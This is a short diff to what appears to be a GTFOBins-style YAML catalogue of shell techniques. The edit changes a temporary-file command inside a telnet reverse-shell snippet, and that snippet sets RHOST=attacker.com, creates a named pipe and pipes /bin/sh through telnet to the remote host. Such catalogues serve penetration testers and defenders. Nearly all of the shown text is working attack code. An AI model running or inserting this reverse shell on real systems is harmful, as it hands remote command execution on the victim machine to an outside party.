@@ -13,7 +13,7 @@ functions:
       code: |
         RHOST=attacker.com
         RPORT=12345
-        TF=$(mktemp)
+        TF=$(mktemp -u)
         rm $TF
         mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
   sudo-enabled:
